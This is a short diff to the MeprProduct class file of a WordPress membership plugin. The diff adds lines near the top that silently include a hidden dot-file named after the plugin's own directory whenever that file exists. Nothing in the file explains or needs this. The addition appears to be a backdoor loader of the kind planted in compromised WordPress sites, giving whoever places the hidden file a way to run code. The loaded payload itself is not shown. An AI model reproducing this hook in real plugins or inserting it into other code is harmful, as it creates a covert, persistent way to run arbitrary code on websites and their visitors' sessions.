@@ -1,6 +1,10 @@
 <?php
 if(!defined('ABSPATH')) {die('You are not allowed to call this page directly.');}
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MeprProduct extends MeprCptModel implements MeprProductInterface {
   public static $price_str                      = '_mepr_product_price';
   public static $period_str                     = '_mepr_product_period';
